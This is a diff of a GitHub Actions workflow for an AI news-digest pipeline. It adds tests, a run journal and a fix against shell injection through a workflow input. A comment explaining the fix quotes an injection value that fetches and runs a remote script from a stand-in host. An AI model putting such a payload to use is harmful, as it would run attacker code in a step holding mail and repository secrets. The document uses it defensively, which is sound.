@@ -36,6 +36,11 @@ jobs:
     # uploaded as a short-lived artifact so you can inspect exactly what the
     # analyst kept/dropped, or what the writer produced, without re-running
     # the whole pipeline - useful while the ranking logic keeps evolving.
+    #
+    # Every step runs a single-stage event bus (see ainews/events.py) and
+    # replays the previous step's JSON as the event it would have received
+    # in-process, so these steps and a plain `ai-news` run exercise the same
+    # handlers. Add --trace to any step to log each event as it is dispatched.
     steps:
       - name: Check out repository
         uses: actions/checkout@v4
@@ -46,11 +51,16 @@ jobs:
           python-version: "3.12"
           cache: pip
 
-      - name: Install dependencies
-        run: pip install -r requirements.txt
+      - name: Install
+        run: pip install -e ".[dev]"
+
+      # Cheaper to catch a broken pipeline here than to find out by not
+      # receiving an email, or by receiving a wrong one.
+      - name: Run tests
+        run: pytest
 
       - name: "Agent 1: Gather stories"
-        run: python -m agents.gatherer --out raw.json
+        run: ai-news gather --out raw.json
 
       - name: Upload raw stories
         if: always()
@@ -62,7 +72,7 @@ jobs:
           if-no-files-found: ignore
 
       - name: "Agent 2: Analyze, rank, and dedupe"
-        run: python -m agents.analyst --in raw.json --out ranked.json --hours "$HOURS" --max-items 35
+        run: ai-news analyze --in raw.json --out ranked.json --hours "$HOURS" --max-items 35
 
       - name: Upload ranked stories
         if: always()
@@ -80,7 +90,7 @@ jobs:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
           LLM_MODEL: ${{ vars.LLM_MODEL }}
-        run: python -m agents.writer --in ranked.json --out-simple simple.md --out-deep deep.md
+        run: ai-news write --in ranked.json --out-simple simple.md --out-deep deep.md
 
       - name: Upload commentary
         if: always()
@@ -93,6 +103,9 @@ jobs:
           retention-days: 7
           if-no-files-found: ignore
 
+      # Fails the step if the email was configured and did not send. Nothing
+      # is marked seen in that case, so the next run picks the same stories
+      # up again rather than losing them - see ainews/delivery/commit.py.
       - name: Deliver the digest
         env:
           SMTP_HOST: ${{ secrets.SMTP_HOST || 'smtp.gmail.com' }}
@@ -101,18 +114,26 @@ jobs:
           SMTP_PASSWORD: ${{ secrets.SMTP_PASSWORD }}
           MAIL_FROM: ${{ secrets.MAIL_FROM }}
           MAIL_TO: ${{ secrets.MAIL_TO || 'Taha.mmtlmu@gmail.com' }}
+          # Workflow inputs reach the shell as an environment variable, never
+          # as a ${{ }} expression inside `run:`. GitHub substitutes those
+          # expressions into the script *as text* before bash sees it, so a
+          # dispatch input of `"; curl evil.sh | sh; #` would execute here -
+          # in the one step that holds SMTP_PASSWORD and GITHUB_TOKEN.
+          SEND_EMAIL: ${{ github.event.inputs.send_email }}
         run: |
-          if [ "${{ github.event.inputs.send_email }}" = "false" ]; then
-            python ai_news.py deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS" --no-email
+          if [ "$SEND_EMAIL" = "false" ]; then
+            ai-news deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS" --no-email
           else
-            python ai_news.py deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS"
+            ai-news deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS"
           fi
 
       - name: Commit today's digest
         run: |
           git config user.name  "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git add "see news" latest.md .seen.json
+          # --ignore-errors: the state files may not exist on a first run,
+          # and a missing one must not fail the step.
+          git add --ignore-errors "see news" latest.md .seen.json .feed-health.json || true
           if git diff --staged --quiet; then
             echo "No new digest to commit."
           else
@@ -127,4 +148,16 @@ jobs:
           name: ai-news-digest
           path: see news/
           retention-days: 30
+          if-no-files-found: ignore
+
+      # The full event log of the run: what the gatherer saw, what the analyst
+      # kept, what the writer produced, in order. `ai-news replay <file>`
+      # re-delivers from it without refetching or paying for another LLM call.
+      - name: Upload run journal
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: run-journal
+          path: runs/
+          retention-days: 14
           if-no-files-found: ignore
